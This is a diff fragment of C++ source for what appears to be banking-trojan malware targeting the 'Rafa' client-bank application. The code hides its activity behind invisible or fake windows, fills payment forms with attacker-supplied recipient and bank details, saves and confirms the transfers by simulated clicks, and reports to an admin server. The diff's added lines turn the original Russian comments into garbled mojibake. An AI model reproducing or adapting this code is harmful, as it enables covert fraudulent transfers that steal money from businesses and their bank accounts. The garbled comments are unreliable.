+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	MainWndProc = (WNDPROC)pSetWindowLongA( parent, GWLP_WNDPROC, (LONG_PTR)HandlerMainWndProc );
-	//проверяем, что была ли уже сделана платежка
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	bool was = false;
 	for(int i = 0; i < c_paymentOrders; i++ )
 		if( paymentOrders[i].entered )
@@ -1629,22 +1640,22 @@ static void WorkInRafa()
 	if( was ) 
 	{
 		offBtDelivery = true;
-		return; //повторно не делаем
+		return; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	}
-	stateFakeWindow = 1; //запуск окна скрывающего наши действия
+	stateFakeWindow = 1; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
 	pCloseHandle(hThread);
 
 	HTREEITEM root = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_ROOT, (LPARAM)0 );
 	if( root )
 	{
-		TreeAccount* itemAccs = (TreeAccount*)MemAlloc( sizeof(TreeAccount) * 16 ); //массив найденных веток счетов, рассчитываем максимум на 16 счетов
+		TreeAccount* itemAccs = (TreeAccount*)MemAlloc( sizeof(TreeAccount) * 16 ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 16 пїЅпїЅпїЅпїЅпїЅпїЅ
 		int c_itemAccs = 0;
-		//находим пункт Шаблоны, делаем несколько попыток, так как не сразу все загружается
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		for( int i = 0; i < 10; i++ )
 		{
 			c_itemAccs = FindPaymentOrder( root, 0, itemAccs, c_itemAccs ); 
-			if( c_itemAccs ) //если найдены счета, то ждем еще немного, так как возможно есть еще счета
+			if( c_itemAccs ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			{
 				//if( i < 7 ) i = 7;
 			}
@@ -1652,15 +1663,15 @@ static void WorkInRafa()
 		}
 		if( c_itemAccs > 0 )
 		{
-			DBGRAFA( "Rafa", "Найдено веток счетов %d", c_itemAccs );
+			DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ %d", c_itemAccs );
 #ifdef TEST_NOTAZ
 			PaymentOrder* po = 0;
 #else
-			PaymentOrder* po = GetPaymentOrders(); //передаем баланс и получаем данные для заполнения платежки
+			PaymentOrder* po = GetPaymentOrders(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #endif
 			if( po ) 
 			{
-				//ищем счет в котором будем добавлять платежку
+				//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				TreeAccount* itemAcc = 0;
 				for( int i = 0; i < c_itemAccs; i++ )
 					if( m_lstrcmp( po->sendAcc, itemAccs[i].acc ) == 0 )
@@ -1670,7 +1681,7 @@ static void WorkInRafa()
 					}
 				if( itemAcc && pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemAcc->itemTmpls ) )
 				{
-					DBGRAFA( "Rafa", "Шаблоны выбраны для счета %s", itemAcc->acc );
+					DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", itemAcc->acc );
 					int indList = -1;
 					for( int i = 0; i < 10; i++ )
 					{
@@ -1680,20 +1691,20 @@ static void WorkInRafa()
 					}
 					if( indList >= 0 )
 					{
-						DBGRAFA( "Rafa", "Найдено новое платежное поручение" );
+						DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 						POINT posItem;
 						pSendMessageA( listView, LVM_GETITEMPOSITION, (WPARAM)indList, (LPARAM)&posItem );
-						stateFakeWindow |= 2; //ожидаем появления окна Платёжного поручения и делаем его прозрачным
+						stateFakeWindow |= 2; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						HardClickToWindow( listView, posItem.x + 5, posItem.y + 5 );
-						DBGRAFA( "Rafa", "Кликнули по новому платежному поручению" );
+						DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 						FindTreeList();
 						if( toolBar )
 						{
 							HardClickToWindow( toolBar, posBtNewDoc.x + 5, posBtNewDoc.y + 5 );
-							DBGRAFA( "Rafa", "Нажали кнопку создания нового документа" );
-							//перемещаем курсор мышки подальше, так как в окне ввода платежа появляются подсказки под курсором
+							DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
+							//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, 0, 0, 0, 0 );
-							//ждем появления формы ввода платежа
+							//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							HWND formPayment = 0;
 							for( int i = 0; i < 10; i++ )
 							{
@@ -1704,25 +1715,25 @@ static void WorkInRafa()
 							if( formPayment )
 							{
 								//PaymentWndProc = (WNDPROC)SetWindowLongPtr( formPayment, GWLP_WNDPROC, (LONG_PTR)HandlerPaymentWndProc );
-								DBGRAFA( "Rafa", "Форма ввода платежа открыта" );
-								stateFakeWindow |= 4; //делаем прозрачными все всплывающие окна во время ввода платежки
-								pSleep(2000); //ждем пока окно полностью инициализируется
-								stateFakeWindow |= 16; //новые окна делаем с нулевой прозрачностью. чтобы их не было видно (всплывающие подсказки. при прозрачности 1, он все равно видны)
-								//ищем контролы в которые будем вводить
+								DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
+								stateFakeWindow |= 4; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+								pSleep(2000); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+								stateFakeWindow |= 16; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1, пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
+								//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 								ControlFinded* cf = (ControlFinded*)HEAP::Alloc( sizeof(ControlFinded) * sizeof(controlsPaymentOrder) / sizeof(ControlForm) );
 								int countControls = FindControls( formPayment, controlsPaymentOrder, cf );
-								if( countControls ) //нашли нужные контролы, теперь заполняем
+								if( countControls ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 								{
-									DBGRAFA( "Rafa", "Заполняем контролы" );
+									DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 									//SetText( "num", "1", cf, countControls );
 									//SetText( "status", "2", cf, countControls );
 									
-									//считаем название организации отправителя
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									TMemory org(512);
 									GetText( "namesend", org, org.Size(), cf, countControls );
 									m_lstrcat( org, " -> " );
-									m_lstrcat( org, po->recvName ); //добавляем имя организации получателя
-									SendLogToAdmin( 2, org ); //шлем лог с именами организаций
+									m_lstrcat( org, po->recvName ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+									SendLogToAdmin( 2, org ); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									SetText( "sum", po->sum, cf, countControls );
 									SetText( "innrecv", po->inn, cf, countControls );
 									SetText( "kpprecv", po->kpp, cf, countControls );
@@ -1732,12 +1743,12 @@ static void WorkInRafa()
 									SetText( "bankrecv", po->bankName, cf, countControls );
 									SetText( "accbankrecv", po->bankAcc, cf, countControls );
 									SetText( "punktrecv", po->bankCity, cf, countControls );
-									SetText( "comment", po->comment, cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст
+									SetText( "comment", po->comment, cf, countControls, " " ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-									stateFakeWindow |= 8; //ловим всплывающее меню НДС
-									retMenuNds = po->nds[0] == '0' ? 4 : 5; //что нужно выбрать в меню НДС (4 - без ндс, 5 - с ндс)
-									ClickButton( "nds", cf, countControls ); //кликаем на кнопку, которая открывает меню NDS
-									//ждем появления меню, на самом деле оно не появится, просто функция TrackPopupMenu сразу вернет нужное нам значение
+									stateFakeWindow |= 8; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+									retMenuNds = po->nds[0] == '0' ? 4 : 5; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ (4 - пїЅпїЅпїЅ пїЅпїЅпїЅ, 5 - пїЅ пїЅпїЅпїЅ)
+									ClickButton( "nds", cf, countControls ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ NDS
+									//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ TrackPopupMenu пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									for( int i = 0; i < 10; i++ )
 									{
 										if( (stateFakeWindow & 8) == 0 ) break;
@@ -1751,14 +1762,14 @@ static void WorkInRafa()
 										pSendMessageA( formPayment, WM_COMMAND, 0, (LPARAM)ctrl->wnd );
 									}
 
-									//сохраняем платежку								
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ								
 									ClickButton( "save", cf, countControls );
-									pSleep(5000); //ждем пока сохранится
-									stateFakeWindow &= ~16; //снимаем нулевую прозрачность, будет прозрачность = 1 (в нулевой прозрачности не действуют клики)
+									pSleep(5000); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+									stateFakeWindow &= ~16; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ = 1 (пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
 									HardClickToWindow( toolBar, posBtDelivery.x + 5, posBtDelivery.y + 5 );
-									DBGRAFA( "Rafa", "Нажали кнопку 'Доставка' %d,%d", posBtDelivery.x, posBtDelivery.y );
+									DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 'пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ' %d,%d", posBtDelivery.x, posBtDelivery.y );
 									HWND wndConfirmation = 0;
-									//ждем появления окна подтверждения
+									//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 									for( int i = 0; i < 10; i++ )
 									{
 										pSleep(1000);
@@ -1773,9 +1784,9 @@ static void WorkInRafa()
 										pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, p.x, p.y, 0, 0 );
 										pmouse_event( MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, p.x, p.y, 0, 0 );
 										//pSendMessageA( wndConfirmation, WM_MOUSEMOVE, 0, MAKELPARAM(325, 235) );
-										HardClickToWindow( wndConfirmation, 336, 261 ); //нажимаем на кнопку подтверждения
+										HardClickToWindow( wndConfirmation, 336, 261 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 										pSleep(5000);
-										//сворачиваем дерево до первоначального состояния
+										//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 										TreeViewCollapse( itemAcc->itemTmpls, 4 );
 										pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
 										po->entered = true;
@@ -1787,22 +1798,22 @@ static void WorkInRafa()
 								HEAP::Free(cf);
 							}
 							else
-								DBGRAFA( "Rafa", "Форма ввода платежа не открылась" );
+								DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 						}
 					}
 				}
 			}
-			else //если платежку не создавали, то сворачиваем дерево до первоначального состояния
+			else //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				TreeViewCollapse( itemAccs[0].itemTmpls, 2 );
 		}
 		else
-			DBGRAFA( "Rafa", "Шаблоны ненайдены" );
+			DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		MemFree(itemAccs);
 	}
-	stateFakeWindow = 0; //закрываем окно скрытия
+	stateFakeWindow = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 }
 
-//настройка глобальных переменных
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static bool InitData()
 {
 	for( int i = 0; i < maxFileReports; i++ )
@@ -1838,19 +1849,19 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 			}
 			if( !hookDll ) break;
 			InitData();
-			//ждем пока появится основное окно в котором должны быть контролы TreeView и ListView
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TreeView пїЅ ListView
 			for( int i = 0; i < 300; i++ )
 			{
 				if( FindTreeList() )
 				{
 					DBGRAFA( "Rafa", "Find TreeView and ListView" );
-					//формируем имя файла в котором будут хранится сосзданные платежки
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					if( GetAllUsersProfile( filePayments, sizeof(filePayments), "rafa.dat" ) )
 					{
 						char* path = UIDCrypt::CryptFileName( filePayments, true );
 						m_lstrcpy( filePayments, path );
 						HEAP::Free(path);
-						DBGRAFA( "Rafa", "Файл с платежками %s", filePayments );
+						DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s", filePayments );
 						LoadPaymentOrders();
 						widthScreen = (int)pGetSystemMetrics(SM_CXSCREEN);
 						heightScreen = (int)pGetSystemMetrics(SM_CYSCREEN);
@@ -1868,7 +1879,7 @@ static DWORD WINAPI InitializeRafaHook( LPVOID p )
 
 void InitHook_FilialRConDll()
 {
-	if( IsNewProcess(PID) ) //чтобы повторно не запустить
+	if( IsNewProcess(PID) ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		HANDLE hThread = pCreateThread( NULL, 0, InitializeRafaHook, 0, 0, 0 );
 		pCloseHandle(hThread);
@@ -1876,23 +1887,23 @@ void InitHook_FilialRConDll()
 	}
 }
 
-//переводит значение баланса в целочисленное число, два последних числа это копейки
-//format = 0 - учитываем копейки, format = 2 - игнорируем копейки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//format = 0 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, format = 2 - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int BalansToInt( const char* s, int format )
 {
 	int v = 0;
-	int kop = -1; //количество чисел в копейках, чтобы при нехватке сделать два числа
+	int kop = -1; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	while( *s )
 	{
 	    if( *s == '.' ) kop = 0;
-		if( *s >= '0' && *s <= '9' ) //игнорируем точку и запятые (1,234,567.89)
+		if( *s >= '0' && *s <= '9' ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (1,234,567.89)
 		{
 			v = v * 10 + (*s - '0');
 			if( kop >= 0 ) kop++;
 		}
 		s++;
 	}
-	//добавляем нули в конце чтобы всегда в копейках было две цифры
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if( (format & 2) == 0 )
 	{
 		if( kop < 0 ) kop = 0;
@@ -1901,20 +1912,20 @@ static int BalansToInt( const char* s, int format )
 	return v;
 }
 
-//переводит целое число в текстовый баланс, если format = 1, то ставить , для разделения тысяч, 
-//если = 2, то обыкновенное число без разделителей, 4 - убрать в конце суммы нули в копейках
